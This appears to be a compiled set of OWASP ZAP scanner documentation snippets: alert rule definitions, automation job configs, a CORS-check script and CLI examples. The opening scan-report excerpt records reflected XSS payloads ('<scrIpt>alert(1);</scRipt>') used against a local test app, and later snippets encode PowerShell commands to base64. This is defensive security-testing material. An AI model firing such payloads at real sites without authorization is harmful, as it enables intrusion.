                    "name": "Cross Site Scripting (Reflected)",
                    "riskcode": "3",
                    "confidence": "2",
                    "riskdesc": "High (Medium)",
                    "desc": "<p>Cross-site Scripting (XSS) is an attack technique that involves ...</p>",
                    "instances":[
                        {
                            "uri": "http://localhost:8080/bodgeit/search.jsp?q=%3C%2Ffont%3E%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E%3Cfont%3E",
                            "method": "GET",
                            "param": "q",
                            "attack": "</font><scrIpt>alert(1);</scRipt><font>",
                            "evidence": "</font><scrIpt>alert(1);</scRipt><font>",
                            "otherinfo": ""
                        },
                        {
                            "uri": "http://localhost:8080/bodgeit/contact.jsp",
                            "method": "POST",
                            "param": "comments",
                            "attack": "</td><scrIpt>alert(1);</scRipt><td>",
                            "evidence": "</td><scrIpt>alert(1);</scRipt><td>",
                            "otherinfo": ""
                        }
                    ],                   
                    "count": "2", 
                    "solution": "<p>Phase: Architecture and Design</p><p>Use a vetted library or framework that does not ...</p>",
                    "otherinfo": "",
                    "reference": "<p>http://projects.webappsec.org/Cross-Site-Scripting</p><p>http://cwe.mitre.org/data/definitions/79.html</p>",
                    "cweid": "79",
                    "wascid": "8",
                    "sourceid": "36977"
                }

----------------------------------------

TITLE: Configuring Shell Shock Alert Definitions in YAML
DESCRIPTION: YAML configuration defining Shell Shock vulnerability scan alerts with unique IDs and names. The configuration links to the Java implementation file that contains the actual scanning logic.

LANGUAGE: yaml
CODE:
title: "Remote Code Execution - Shell Shock"
alertid: 10048
alertindex: 1004800
alerttype: "Active"
status: beta
type: alertset
alerts:
   10048-1:
      alertid: 10048-1
      name: "Remote Code Execution - Shell Shock"
   10048-2:
      alertid: 10048-2
      name: "Remote Code Execution - Shell Shock"
code: https://github.com/zaproxy/zap-extensions/blob/main/addOns/ascanrulesBeta/src/main/java/org/zaproxy/zap/extension/ascanrulesBeta/ShellShockScanRule.java
linktext: "org/zaproxy/zap/extension/ascanrulesBeta/ShellShockScanRule.java"

----------------------------------------

TITLE: Configuring Delay Job in YAML for ZAP Automation Framework
DESCRIPTION: This YAML snippet demonstrates how to configure a delay job in ZAP's Automation Framework. It allows setting a wait time and specifying a file name that, if created, will end the delay early. The time parameter supports formats 'hh:mm:ss', 'mm:ss', and 'ss'.

LANGUAGE: yaml
CODE:
  - type: delay                        # Pause the plan for a set period of time or event (file created, static method called, API end point called)
    parameters:
      time:                            # String: The time to wait, format any of ['hh:mm:ss', 'mm:ss', 'ss'], default: 0
      fileName:                        # String: Name of a file which will cause the job to end early if created, default: empty

----------------------------------------

TITLE: Defining Content Security Policy (CSP) Alert Configurations in YAML
DESCRIPTION: This YAML snippet defines alert configurations for Content Security Policy (CSP) header-related issues. It includes metadata such as alert IDs, names, and types for three different CSP alerts.

LANGUAGE: yaml
CODE:
title: "Content Security Policy (CSP) Header Not Set"
alertid: 10038
alertindex: 1003800
alerttype: "Passive"
status: release
type: alertset
alerts:
   10038-1:
      alertid: 10038-1
      name: "Content Security Policy (CSP) Header Not Set"
   10038-2:
      alertid: 10038-2
      name: "Obsolete Content Security Policy (CSP) Header Found"
   10038-3:
      alertid: 10038-3
      name: "Content Security Policy (CSP) Report-Only Header Found"
code: https://github.com/zaproxy/zap-extensions/blob/main/addOns/pscanrules/src/main/java/org/zaproxy/zap/extension/pscanrules/ContentSecurityPolicyMissingScanRule.java
linktext: "org/zaproxy/zap/extension/pscanrules/ContentSecurityPolicyMissingScanRule.java"

----------------------------------------

TITLE: Information Disclosure Alert Definition
DESCRIPTION: Alert definition for detecting sensitive information disclosure in HTTP Referrer headers. Includes alert metadata, risk level, solution guidance, and CWE/WASC classifications.

LANGUAGE: markdown
CODE:
title: "Information Disclosure - Sensitive Information in HTTP Referrer Header"
alertid: 10025
alertindex: 1002500
alerttype: "Passive"
alertcount: 1
status: release
type: alert
risk: Informational
solution: "Do not pass sensitive information in URIs."
other: "The URL in the HTTP referrer header field appears to contain US Social Security Number(s)."
cwe: 598
wasc: 13
alerttags: 
  - CWE-598
  - OWASP_2017_A03
  - OWASP_2021_A01

----------------------------------------

TITLE: Implementing Remote File Inclusion Scan Rule in Java
DESCRIPTION: This code snippet represents the implementation of the Remote File Inclusion scan rule in ZAP. It is part of the active scan rules and is responsible for detecting RFI vulnerabilities in web applications.

LANGUAGE: java
CODE:
https://github.com/zaproxy/zap-extensions/blob/main/addOns/ascanrules/src/main/java/org/zaproxy/zap/extension/ascanrules/RemoteFileIncludeScanRule.java

----------------------------------------

TITLE: Configuring Big Redirect Detection Alerts in YAML for ZAProxy
DESCRIPTION: Defines two alert types for detecting potential sensitive information leaks through redirects. It includes alert IDs, names, and a link to the Java implementation.

LANGUAGE: yaml
CODE:
title: "Big Redirect Detected (Potential Sensitive Information Leak)"
alertid: 10044
alertindex: 1004400
alerttype: "Passive"
status: release
type: alertset
alerts:
   10044-1:
      alertid: 10044-1
      name: "Big Redirect Detected (Potential Sensitive Information Leak)"
   10044-2:
      alertid: 10044-2
      name: "Multiple HREFs Redirect Detected (Potential Sensitive Information Leak)"
code: https://github.com/zaproxy/zap-extensions/blob/main/addOns/pscanrules/src/main/java/org/zaproxy/zap/extension/pscanrules/BigRedirectsScanRule.java
linktext: "org/zaproxy/zap/extension/pscanrules/BigRedirectsScanRule.java"

----------------------------------------

TITLE: Setting ZAP Log Level via Command Line
DESCRIPTION: New command line option '-loglevel' that allows overriding the log level specified in log4j2.properties file.

LANGUAGE: bash
CODE:
-loglevel

----------------------------------------

TITLE: Recursive Traversal of .DS_Store Blocks in ZAP Spider
DESCRIPTION: This Java method recursively traverses the blocks in a .DS_Store file, extracting filenames and processing URLs for further probing by the ZAP Spider.

LANGUAGE: java
CODE:
private void traverse(Block block, ParseContext ctx) throws Exception {
    getLogger().debug("Traversing");
    Block nextBlock = block.rightmostBlock();

    if (nextBlock != null) {
        traverse(nextBlock, ctx);
    }

    Set<String> alreadyChecked = new HashSet<>();
    for (BlockData blockData : block.data()) {
        nextBlock = blockData.block();

        if (nextBlock != null) {
            getLogger().debug("Recursed");
            traverse(nextBlock, ctx);
        }
        String entry = blockData.record().filename().value();
        if (alreadyChecked.contains(entry)) {
            getLogger().debug("{} already done", entry);
            continue;
        }
        alreadyChecked.add(entry);
        getLogger().debug("Processing: {}", entry);
        processUrl(ctx, entry);
    }
}

----------------------------------------

TITLE: Pruning Sites Tree in ZAP Automation Framework
DESCRIPTION: Job configuration for removing nodes from the Sites Tree using YAML format file input. Requires specifying the file containing Sites Tree data to be pruned.

LANGUAGE: yaml
CODE:
  - type: prune           # Prunes nodes from the Sites Tree using Sites Tree data (YAML) from a file
    parameters:
      fileName:           # String: Name/path to the file

----------------------------------------

TITLE: Active ZAP Script for Checking CORS Headers (ASVS 14.5.3)
DESCRIPTION: This Python script for ZAP actively tests the Cross-Origin Resource Sharing (CORS) configuration as required by ASVS control 14.5.3. It sends requests with a custom Origin header and checks if the Access-Control-Allow-Origin response header is properly restricted.

LANGUAGE: Python
CODE:
import re

alertTitle = '14.5.3 Verify that the cross-domain resource sharing (CORS) Access-Control-Allow-Origin header uses a strict white-list of trusted domains to match against and does not support the "null" origin.'
alertDescription = "This controls checks if CORS policy is properly configured."
alertRisk = 0
alertReliability = 1
alertSolution = ["Use a strict whitelist of sites allowed to request resources of your domain", ""]
alertInfo = "Control failure"
cweID = 346
wascID = 0

origin = "exampletestsite.com"

def scanNode(sas, msg):
  origMsg = msg;
  # Copy requests before reusing them
  msg = origMsg.cloneRequest();
  
  # GET resource that doesn't exist
  msg.getRequestHeader().setHeader("Origin", origin)

  # sendAndReceive(msg, followRedirect, handleAntiCSRFtoken) 
  if (sas.isStop()):
    return
  sas.sendAndReceive(msg, True, False);

  header = str(msg.getResponseHeader().getHeader("Access-Control-Allow-Origin"))
  if (header == "*"):
    alertParam = "wildcard directive in Access-Control-Allow-Origin"
    sas.raiseAlert(alertRisk, alertReliability, alertTitle, alertDescription, 
      msg.getRequestHeader().getURI().toString(), 
      alertParam, "", alertInfo, alertSolution[0], "", cweID, wascID, msg);
  elif (header == origin):
    alertParam = "Access-Control-Allow-Origin reflects Origin header"
    sas.raiseAlert(alertRisk, alertReliability, alertTitle, alertDescription, 
      msg.getRequestHeader().getURI().toString(), 
      alertParam, "", alertInfo, alertSolution[0], "", cweID, wascID, msg);
  elif (header == "null"):
    alertParam = "Access-Control-Allow-Origin is null"
    sas.raiseAlert(alertRisk, alertReliability, alertTitle, alertDescription, 
      msg.getRequestHeader().getURI().toString(), 
      alertParam, "", alertInfo, alertSolution[0], "", cweID, wascID, msg);

----------------------------------------

TITLE: Defining CSP Alert Set in YAML
DESCRIPTION: This YAML configuration defines a set of Content Security Policy (CSP) related alerts for the ZAP security tool. It includes metadata about the alert set and individual alert definitions with their respective IDs and names.

LANGUAGE: yaml
CODE:
title: "CSP"
alertid: 10055
alertindex: 1005500
alerttype: "Passive"
status: release
type: alertset
alerts:
   10055-1:
      alertid: 10055-1
      name: "CSP: X-Content-Security-Policy"
   10055-2:
      alertid: 10055-2
      name: "CSP: X-WebKit-CSP"
   10055-3:
      alertid: 10055-3
      name: "CSP: Notices"
   10055-4:
      alertid: 10055-4
      name: "CSP: Wildcard Directive"
   10055-5:
      alertid: 10055-5
      name: "CSP: script-src unsafe-inline"
   10055-6:
      alertid: 10055-6
      name: "CSP: style-src unsafe-inline"
   10055-7:
      alertid: 10055-7
      name: "CSP: script-src unsafe-hashes"
   10055-8:
      alertid: 10055-8
      name: "CSP: style-src unsafe-hashes"
   10055-9:
      alertid: 10055-9
      name: "CSP: Malformed Policy (Non-ASCII)"
   10055-10:
      alertid: 10055-10
      name: "CSP: script-src unsafe-eval"
   10055-11:
      alertid: 10055-11
      name: "CSP: Meta Policy Invalid Directive"
   10055-12:
      alertid: 10055-12
      name: "CSP: Header & Meta"
   10055-13:
      alertid: 10055-13
      name: "CSP: Failure to Define Directive with No Fallback"

----------------------------------------

TITLE: Defining Selenium API Actions and Views in Markdown
DESCRIPTION: A markdown table listing the available Selenium API actions and views in ZAP, including their names, types, parameters, and descriptions.

LANGUAGE: markdown
CODE:
|            Name            |  Type  |           Parameters           |                        Description                         |
|----------------------------|--------|--------------------------------|------------------------------------------------------------|\n| getBrowserArguments        | view   | browser*                      | Gets the browser arguments.                                |
| optionChromeBinaryPath     | view   |                                | Returns the current path to Chrome binary                  |
| optionChromeDriverPath     | view   |                                | Returns the current path to ChromeDriver                   |
| optionFirefoxBinaryPath    | view   |                                | Returns the current path to Firefox binary                 |
| optionFirefoxDriverPath    | view   |                                | Returns the current path to Firefox driver (geckodriver)   |
| addBrowserArgument         | action | browser* argument* enabled   | Adds a browser argument.                                   |
| launchBrowser              | action | browser*                      | Launches a browser proxying through ZAP, for manual usage. |
| removeBrowserArgument      | action | browser* argument*           | Removes a browser argument.                                |
| setBrowserArgumentEnabled  | action | browser* argument* enabled* | Sets whether or not a browser argument is enabled.         |
| setOptionChromeBinaryPath  | action | String*                       | Sets the current path to Chrome binary                     |
| setOptionChromeDriverPath  | action | String*                       | Sets the current path to ChromeDriver                      |
| setOptionFirefoxBinaryPath | action | String*                       | Sets the current path to Firefox binary                    |
| setOptionFirefoxDriverPath | action | String*                       | Sets the current path to Firefox driver (geckodriver)      |

----------------------------------------

TITLE: Java JAR Execution
DESCRIPTION: Direct execution of ZAP JAR file using Java

LANGUAGE: shell
CODE:
java -jar zap.jar

----------------------------------------

TITLE: YAML Alert Configuration for HSTS Max-Age Validation
DESCRIPTION: YAML configuration defining the security alert parameters for detecting malformed HSTS max-age directives. Includes alert ID, risk level, solution guidance, and relevant security standard references.

LANGUAGE: yaml
CODE:
title: "Strict-Transport-Security Max-Age Malformed (Non-compliant with Spec)"
alertid: 10035-7
alertindex: 1003507
alerttype: "Passive"
alertcount: 8
status: release
type: alert
risk: Low
solution: "Review the configuration of this control. Ensure that your web server, application server, load balancer, etc. is configured to set Strict-Transport-Security with an appropriate format."
references:
   - https://datatracker.ietf.org/doc/html/rfc6797#section-6.1
other: ""
cwe: 319
wasc: 15
alerttags: 
  - CWE-319
  - OWASP_2017_A06
  - OWASP_2021_A05
code: https://github.com/zaproxy/zap-extensions/blob/main/addOns/pscanrules/src/main/java/org/zaproxy/zap/extension/pscanrules/StrictTransportSecurityScanRule.java
linktext: "org/zaproxy/zap/extension/pscanrules/StrictTransportSecurityScanRule.java"
help: https://www.zaproxy.org/docs/desktop/addons/passive-scan-rules/#id-10035

----------------------------------------

TITLE: Implementing Heartbleed Vulnerability Detection in Java for ZAP
DESCRIPTION: This code snippet is part of ZAP's passive scan rules, specifically for detecting the Heartbleed OpenSSL vulnerability. It's implemented in Java and likely contains logic to identify vulnerable OpenSSL versions and generate appropriate alerts.

LANGUAGE: java
CODE:
https://github.com/zaproxy/zap-extensions/blob/main/addOns/pscanrules/src/main/java/org/zaproxy/zap/extension/pscanrules/HeartBleedScanRule.java

----------------------------------------

TITLE: SQL Injection Alert Configuration in YAML
DESCRIPTION: YAML configuration for a MySQL SQL injection security alert, including metadata like alert ID, risk level, and associated security standards references.

LANGUAGE: yaml
CODE:
title: "SQL Injection - MySQL"
alertid: 40019
alertindex: 4001900
alerttype: "Active"
alertcount: 1
status: release
type: alert
risk: High
cwe: 89
wasc: 19
techtags: 
  - Db.MySQL
alerttags: 
  - OWASP_2017_A01
  - OWASP_2021_A03
  - POLICY_DEV_FULL
  - POLICY_QA_FULL
  - POLICY_QA_STD
  - POLICY_SEQUENCE
  - WSTG-v42-INPV-05

----------------------------------------

TITLE: Anti-CSRF Token Check Alert Configuration
DESCRIPTION: YAML configuration for the Anti-CSRF token scanning rule, defining alert properties including ID, risk level, and associated security standards references.

LANGUAGE: yaml
CODE:
title: "Anti-CSRF Tokens Check"
alertid: 20012
alertindex: 2001200
alerttype: "Active"
alertcount: 1
status: beta
type: alert
risk: Medium
cwe: 352
wasc: 9
alerttags: 
  - CWE-352
  - OWASP_2017_A06
  - OWASP_2021_A05
  - POLICY_QA_FULL
  - POLICY_QA_STD
  - WSTG-v42-SESS-05

----------------------------------------

TITLE: Setting Log Level via CLI
DESCRIPTION: Command line option to set logging level when starting ZAP in daemon mode, available in ZAP 2.15.0 and later.

LANGUAGE: shell
CODE:
zap.sh -daemon -loglevel debug

----------------------------------------

TITLE: Implementing OS Command Injection Scan Rule in Java
DESCRIPTION: The scan rule implementation for detecting OS command injection vulnerabilities in ZAP. Located in CommandInjectionScanRule.java, this code performs active scanning to identify potential command injection points by testing various payloads and analyzing responses.

LANGUAGE: java
CODE:
// Source file reference only - no embedded code snippets:
https://github.com/zaproxy/zap-extensions/blob/main/addOns/ascanrules/src/main/java/org/zaproxy/zap/extension/ascanrules/CommandInjectionScanRule.java

----------------------------------------

TITLE: Scanning for Obsolete CSP Headers in Java
DESCRIPTION: This code snippet is part of a passive scan rule in ZAP (Zed Attack Proxy) that checks for missing or obsolete Content Security Policy headers. It is implemented in the ContentSecurityPolicyMissingScanRule class.

LANGUAGE: java
CODE:
https://github.com/zaproxy/zap-extensions/blob/main/addOns/pscanrules/src/main/java/org/zaproxy/zap/extension/pscanrules/ContentSecurityPolicyMissingScanRule.java

----------------------------------------

TITLE: Structural Parameter Examples
DESCRIPTION: Examples showing how parameters can affect site structure, requiring special handling in ZAP.

LANGUAGE: plaintext
CODE:
GET https://www.example.com?a=b&action=add
GET https://www.example.com?a=b&action=delete

----------------------------------------

TITLE: SSRF Alert Configuration in YAML
DESCRIPTION: YAML configuration for SSRF security alert definition, including alert ID, risk level, references, and associated security standards like CWE and WASC.

LANGUAGE: yaml
CODE:
title: "Server Side Request Forgery"
alertid: 40046
alertindex: 4004600
alerttype: "Active"
alertcount: 1
status: beta
type: alert
risk: High
solution: "Do not accept remote addresses as request parameters, and if you must, ensure that they are validated against an allow-list of expected values."
references:
   - https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html
other: "The canary token from the out-of-band service was found in the response body."
cwe: 918
wasc: 20
alerttags: 
  - CWE-918
  - OUT_OF_BAND
  - OWASP_2021_A10
  - POLICY_DEV_FULL
  - POLICY_QA_FULL
  - POLICY_SEQUENCE
  - WSTG-v42-INPV-19
code: https://github.com/zaproxy/zap-extensions/blob/main/addOns/ascanrulesBeta/src/main/java/org/zaproxy/zap/extension/ascanrulesBeta/SsrfScanRule.java
linktext: "org/zaproxy/zap/extension/ascanrulesBeta/SsrfScanRule.java"
help: https://www.zaproxy.org/docs/desktop/addons/active-scan-rules-beta/#id-40046

----------------------------------------

TITLE: Implementing X-AspNet-Version Header Detection in Java for ZAP
DESCRIPTION: This code snippet represents the implementation of a passive scan rule in ZAP to detect X-AspNet-Version and X-AspNetMvc-Version headers. It's part of the org.zaproxy.zap.extension.pscanrules package.

LANGUAGE: java
CODE:
https://github.com/zaproxy/zap-extensions/blob/main/addOns/pscanrules/src/main/java/org/zaproxy/zap/extension/pscanrules/XAspNetVersionScanRule.java

----------------------------------------

TITLE: ZAP API Scan Authentication Configuration
DESCRIPTION: Example of configuring authentication headers for API scanning using the Replacer add-on.

LANGUAGE: bash
CODE:
  -config replacer.full_list\(0\).description=auth1 \
  -config replacer.full_list\(0\).enabled=true \
  -config replacer.full_list\(0\).matchtype=REQ_HEADER \
  -config replacer.full_list\(0\).matchstr=Authorization \
  -config replacer.full_list\(0\).regex=false \
  -config replacer.full_list\(0\).replacement=123456789 \
  -config replacer.full_list\(1\).description=auth2 \
  -config replacer.full_list\(1\).enabled=true \
  -config replacer.full_list\(1\).matchtype=REQ_HEADER \
  -config replacer.full_list\(1\).matchstr=AnotherHeader \
  -config replacer.full_list\(1\).regex=false \
  -config replacer.full_list\(1\).replacement=abcdefghi

----------------------------------------

TITLE: PowerShell Encoding Command in PowerShell
DESCRIPTION: A PowerShell script to encode a command 'dir' to UTF-16LE and base64 format.

LANGUAGE: powershell
CODE:
$command = 'dir'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [Convert]::ToBase64String($bytes)
echo $encodedCommand

----------------------------------------

TITLE: YAML Configuration for Persistent XSS Prime Scanner
DESCRIPTION: Metadata configuration for a ZAP scanner rule that defines properties like alert ID, risk level, and associated security standards (OWASP, WSTG). The configuration includes references to implementation code and documentation.

LANGUAGE: yaml
CODE:
title: "Cross Site Scripting (Persistent) - Prime"
alertid: 40016
alertindex: 4001600
alerttype: "Active"
alertcount: 1
status: release
type: alert
risk: Informational
solution: ""
other: ""
cwe: 79
wasc: 8
alerttags: 
  - OWASP_2017_A07
  - OWASP_2021_A03
  - POLICY_DEV_FULL
  - POLICY_QA_FULL
  - POLICY_QA_STD
  - WSTG-v42-INPV-02
code: https://github.com/zaproxy/zap-extensions/blob/main/addOns/ascanrules/src/main/java/org/zaproxy/zap/extension/ascanrules/PersistentXssPrimeScanRule.java
linktext: "org/zaproxy/zap/extension/ascanrules/PersistentXssPrimeScanRule.java"
help: https://www.zaproxy.org/docs/desktop/addons/active-scan-rules/#id-40014

----------------------------------------

TITLE: Defining Anti-clickjacking Alert Configuration in YAML
DESCRIPTION: YAML configuration that defines four different alert types for anti-clickjacking header scanning. The configuration includes alert IDs, names, and metadata for different scenarios of X-Frame-Options header implementation issues.

LANGUAGE: yaml
CODE:
title: "Anti-clickjacking Header"
alertid: 10020
alertindex: 1002000
alerttype: "Passive"
status: release
type: alertset
alerts:
   10020-1:
      alertid: 10020-1
      name: "Missing Anti-clickjacking Header"
   10020-2:
      alertid: 10020-2
      name: "Multiple X-Frame-Options Header Entries"
   10020-3:
      alertid: 10020-3
      name: "X-Frame-Options Defined via META (Non-compliant with Spec)"
   10020-4:
      alertid: 10020-4
      name: "X-Frame-Options Setting Malformed"

----------------------------------------

TITLE: Configuring GraphQL Job in ZAP Automation Framework
DESCRIPTION: This YAML configuration snippet defines the parameters for the 'graphql' job type in ZAP's Automation Framework. It allows importing GraphQL schemas, configuring query generation, and setting various options for GraphQL testing.

LANGUAGE: yaml
CODE:
  - type: graphql                      # GraphQL definition import
    parameters:
      endpoint:                        # String: the endpoint URL, default: null, no schema is imported
      schemaUrl:                       # String: URL pointing to a GraphQL Schema, default: null, import using introspection on endpoint
      schemaFile:                      # String: Local file path of a GraphQL Schema, default: null, import using schemaUrl
      queryGenEnabled:                 # Bool: Whether the Query Generator is enabled, default: true
      maxQueryDepth:                   # Int: The maximum query generation depth, default: 5
      lenientMaxQueryDepthEnabled:     # Bool: Whether or not Maximum Query Depth is enforced leniently, default: true
      maxAdditionalQueryDepth:         # Int: The maximum additional query generation depth (used if enforced leniently), default: 5
      maxArgsDepth:                    # Int: The maximum arguments generation depth, default: 5
      optionalArgsEnabled:             # Bool: Whether or not Optional Arguments should be specified, default: true
      argsType:                        # Enum [inline, variables, both]: How arguments are specified, default: both 
      querySplitType:                  # Enum [leaf, root_field, operation]: The level for which a single query is generated, default: leaf
      requestMethod:                   # Enum [post_json, post_graphql, get]: The request method, default: post_json

----------------------------------------

TITLE: Listing Available Technology Detection API Views
DESCRIPTION: Documents the three main API views available in the Technology Detection add-on: listSites for viewing all recognized sites, listAll for viewing all sites and their technologies, and listSite for viewing technologies of a specific site.

LANGUAGE: markdown
CODE:
* listSites: Lists all the sites recognized by the Technology Detection add-on.
* listAll: Lists all sites and their associated applications (technologies).
* listSite (site\*): Lists all the applications (technologies) associated with the specified site.

----------------------------------------

TITLE: Implementing Reverse Tabnabbing Detection in Java for ZAP
DESCRIPTION: This code snippet represents the Java implementation of the LinkTargetScanRule in ZAP, which detects reverse tabnabbing vulnerabilities. It scans for links with target attributes that don't use both 'noopener' and 'noreferrer' in their 'rel' attribute.

LANGUAGE: java
CODE:
https://github.com/zaproxy/zap-extensions/blob/main/addOns/pscanrules/src/main/java/org/zaproxy/zap/extension/pscanrules/LinkTargetScanRule.java

----------------------------------------

TITLE: Detecting Application Error Disclosure via WebSockets in JavaScript
DESCRIPTION: A passive scanner script that monitors WebSocket traffic for error messages and warnings that might expose sensitive system information. The scanner helps identify security vulnerabilities where unhandled exceptions or error details are directly exposed to clients, which could be used for further attacks.

LANGUAGE: javascript
CODE:
// Code reference only - actual implementation at\nhttps://github.com/zaproxy/zap-extensions/blob/main/addOns/websocket/src/main/zapHomeFiles/scripts/templates/websocketpassive/Application%20Error%20Scanner.js

----------------------------------------

TITLE: Security Alert Configuration YAML
DESCRIPTION: YAML configuration for a security alert that detects JWT tokens stored in browser localStorage. Includes alert metadata, risk level, solution recommendations, and reference links.

LANGUAGE: yaml
CODE:
title: "Information Disclosure - JWT in Browser localStorage"
alertid: 120002-1
alertindex: 12000201
alerttype: "Client Passive"
alertcount: 2
status: alpha
type: alert
risk: Medium
solution: "This is an informational alert and no action is necessary. "
references:
   - https://www.zaproxy.org/blog/2020-09-03-zap-jwt-scanner/
other: "The following JWT was set: Key: key Header: {'alg': 'HS256', 'typ': 'JWT'} Payload: {'sub': '1234567890', 'name': 'John Doe', 'iat': 1516239022'} Signature: d35db7e39ebbf34d76df8e7aefcd35db7e39ebbf34d76df8e7aefcd35db7e39ebbf34d76df8e7aefcd35db7e39ebbf Note that this alert will only be raised once for each URL + key."
cwe: 922
wasc: 13
alerttags: 
  - CWE-922
code: https://github.com/zaproxy/zap-extensions/blob/main/addOns/client/src/main/java/org/zaproxy/addon/client/pscan/JwtInStorageScanRule.java
linktext: "org/zaproxy/addon/client/pscan/JwtInStorageScanRule.java"
help: https://www.zaproxy.org/docs/desktop/addons/client-side-integration/pscan/#id-120002

----------------------------------------

TITLE: Implementing getMetadata Function for ZAP Scan Rules
DESCRIPTION: Example implementation of the getMetadata function that defines a scan rule's metadata using YAML format. The function returns metadata including rule ID, name, description, solution, references, category, risk level, confidence level, CWE ID, WASC ID, alert tags, and other information.

LANGUAGE: javascript
CODE:
function getMetadata() {
	return ScanRuleMetadata.fromYaml(`
id: 12345
name: Active Vulnerability Title
description: Full description
solution: The solution
references:
  - Reference 1
  - Reference 2
category: INJECTION  # info_gather, browser, server, misc, injection
risk: INFO  # info, low, medium, high
confidence: LOW  # false_positive, low, medium, high, user_confirmed
cweId: 0
wascId: 0
alertTags:
  name1: value1
  name2: value2
otherInfo: Any other Info
status: alpha
`);
}

----------------------------------------

TITLE: Running ZAP Scan with Hooks via Command Line
DESCRIPTION: Shell commands demonstrating how to run ZAP baseline scan with custom hooks, both directly and using Docker. Shows how to mount local directories and specify hook file location.

LANGUAGE: shell
CODE:
# Run baseline directly
zap-baseline.py -t https://example.com --hook=my-hooks.py

# or using Docker 
docker run -v $(pwd):/zap/wrk/:rw -t ghcr.io/zaproxy/zaproxy:stable zap-baseline.py \
    -t https://www.example.com -g gen.conf -r testreport.html --hook=/zap/wrk/my-hooks.py

----------------------------------------

TITLE: Alert Configuration YAML for Content-Type Header Checks
DESCRIPTION: YAML configuration defining alert IDs and names for Content-Type header validation rules in ZAP scanner. Includes alerts for both missing headers (10019-1) and empty headers (10019-2).

LANGUAGE: yaml
CODE:
title: "Content-Type Header Missing"
alertid: 10019
alertindex: 1001900
alerttype: "Passive"
status: release
type: alertset
alerts:
   10019-1:
      alertid: 10019-1
      name: "Content-Type Header Missing"
   10019-2:
      alertid: 10019-2
      name: "Content-Type Header Empty"

----------------------------------------

TITLE: PowerShell Encoding Command in Bash
DESCRIPTION: A Bash command to encode a PowerShell command 'dir' to UTF-16LE and base64 format.

LANGUAGE: bash
CODE:
printf "dir"| iconv -t UTF-16LE | base64 -w 0 -

----------------------------------------

TITLE: Linking ZAP Java Source Files
DESCRIPTION: References to Java source files containing the implementation of various security scanning rules. The files are hosted on GitHub in the zap-extensions repository.

LANGUAGE: markdown
CODE:
BackupFileDisclosureScanRule.java
SlackerCookieDetector.java
CorsScanRule.java
CrossDomainScanRule.java
CsrfTokenScanRule.java
ExponentialEntityExpansionScanRule.java
ExpressionLanguageInjectionScanRule.java
HttpOnlySiteScanRule.java
HttPoxyScanRule.java
HttpsAsHttpScanRule.java

----------------------------------------

TITLE: Configuring Monitor Job Test in YAML for ZAP Automation Framework
DESCRIPTION: This YAML snippet demonstrates how to configure a monitor job test within the ZAP Automation Framework. It includes parameters for job specification, test name, statistic to monitor, site, threshold, and failure action.

LANGUAGE: yaml
CODE:
  jobs:
  - type: example
    parameters:
      jobSpecificParam: 'value'
    tests:
      - name: 'test one'                      # Name of the test, optional
        type: monitor                         # Specifies that the test is of type 'monitor'
        statistic: 'stats.addon.something'    # Name of an integer / long statistic
        site:                                 # Name of the site for site specific tests, supports vars
        threshold: 10                         # The threshold at which a statistic fails
        onFail: 'info'                        # String: One of 'warn', 'error', 'info', mandatory

----------------------------------------

TITLE: Running ZAP with Webswing using Docker (Weekly Version)
DESCRIPTION: This command runs the weekly version of ZAP with Webswing support using Docker. It maps ports 8080 and 8090, and uses the 'zap' user.

LANGUAGE: bash
CODE:
docker run -u zap -p 8080:8080 -p 8090:8090 -i ghcr.io/zaproxy/zaproxy:weekly zap-webswing.sh

----------------------------------------

TITLE: Spider Dialog Markdown Documentation
DESCRIPTION: Markdown documentation detailing the Spider dialog options and access points for the ZAP Spider tool. Includes information about scope settings, user authentication, recursive crawling, subtree restrictions and advanced configuration options.

LANGUAGE: markdown
CODE:
# Spider dialog

This dialog launches the [Spider](/docs/desktop/addons/spider/).

## Scope

The first tab allows you to select or change the starting point.  
If the starting point is in one or more Contexts then you will be able to choose one of them.  
If that context has any Users defined then you will be able to select one of them.  
If you select one of the users then the spider will be performed as that user, with ZAP (re)authenticating as that user whenever necessary.   

If you select 'Recurse' then all of the nodes underneath the one selected will also be used to seed the Spider.   

If you select 'Spider Subtree Only' the Spider will only access resources that are under the starting point (URI). When evaluating if a resource is found within the specified subtree, the Spider considers only the scheme, host, port, and path components of the URI.   

If you select 'Show Advanced Options' then the following tab will be shown which provides fine grain control over the spider process.   

Clicking on the 'Reset' button will reset all of the options to their default values.

## Advanced

The parameters on this tab correspond to the same parameters on the [Options Spider screen](/docs/desktop/addons/spider/options/).

----------------------------------------

TITLE: Detecting Base64 Disclosure in WebSocket Messages using JavaScript
DESCRIPTION: This script template is designed to passively scan WebSocket messages for Base64-encoded strings, which may contain sensitive information. It generates an alert when such strings are detected.

LANGUAGE: javascript
CODE:
// The link to the actual code is provided, but the code itself is not present in the given text.
// Link: https://github.com/zaproxy/zap-extensions/blob/main/addOns/websocket/src/main/zapHomeFiles/scripts/templates/websocketpassive/Base64%20Disclosure.js

----------------------------------------

TITLE: Alert Configuration in YAML
DESCRIPTION: YAML configuration for a Java serialization object detection alert, including risk level, solution recommendations, and related security references.

LANGUAGE: yaml
CODE:
title: "Java Serialization Object"
alertid: 90002
alertindex: 9000200
alerttype: "Passive"
alertcount: 1
status: beta
type: alert
risk: Medium
solution: "Deserialization of untrusted data is inherently dangerous and should be avoided."
references:
   - https://www.oracle.com/java/technologies/javase/seccodeguide.html#8
other: ""
cwe: 502
alerttags: 
  - CWE-502
  - OWASP_2017_A08
  - OWASP_2021_A04
code: https://github.com/zaproxy/zap-extensions/blob/main/addOns/pscanrulesBeta/src/main/java/org/zaproxy/zap/extension/pscanrulesBeta/JsoScanRule.java
linktext: "org/zaproxy/zap/extension/pscanrulesBeta/JsoScanRule.java"
help: https://www.zaproxy.org/docs/desktop/addons/passive-scan-rules-beta/#id-90002

----------------------------------------

TITLE: Configuring Sequence Import Job in ZAP Automation Framework
DESCRIPTION: YAML configuration for importing sequences from HAR files. Allows specifying the sequence name, file path, and assertion options for status code and length validation.

LANGUAGE: yaml
CODE:
  - type: sequence-import      # Imports a sequence from a HAR file.
    parameters:
      name:                    # The name by which the seq will be known in ZAP.
      path:                    # The full/relative path to the HAR file to import.
      assertCode:              # Boolean, if true add status code assertion.
      assertLength:            # Integer, if supplied then add approx len assertion (value between 0 and 100).

----------------------------------------

